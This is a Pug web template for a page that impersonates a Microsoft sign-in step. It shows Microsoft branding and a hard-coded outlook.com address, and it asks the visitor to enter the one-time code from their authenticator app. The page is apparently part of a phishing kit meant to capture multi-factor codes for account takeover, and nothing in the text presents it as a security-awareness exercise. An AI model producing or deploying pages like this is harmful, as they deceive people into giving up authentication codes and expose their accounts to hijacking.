extends layout

block content
    .container.full-screen.d-flex.justify-content-center.align-items-center
        #form.w-100.d-flex.justify-content-center.align-items-center
            form(class="col-lg-6 col-md-10 col-sm-12 shadow-lg p-4 mb-5 bg-body rounded")
                .d-grid.gap-4
                    .d-flex
                        img(src='../MS%20Logo.jpg', style='height: 2.5rem', alt='Microsoft Logo')
                        h2#microsoft.px-2 Microsoft
                    #example.p roady@outlook.com
                #signin.h2 Enter Code
                p.message
                    img(src='../chat.png', style='height: 1.25rem; padding-left: 0rem', alt='Chat Icon')
                    |  Please type the code displayed on your authenticator app from your device
                .form-group
                    label(for='password')
                    input#password(type='text', pattern='[0-9]*', style='margin: 0rem')
                .d-grid.gap-1
                    p(style='margin-top:1rem')
                        | Having trouble?
                        a#option.link-primary(href='#')  Sign in another way?
                    .d-flex.flex-row.justify-content-end
                        button#login.btn.btn-primary(type='submit', name='login', style='background-color: #0864b4') Verify
                    br
                .row.py-0
                    .col-md-12
                        .form-group
                            h2.py-0.text-center
    script(src='https://cdn.jsdelivr.net/npm/bootstrap@5.2.2/dist/js/bootstrap.min.js')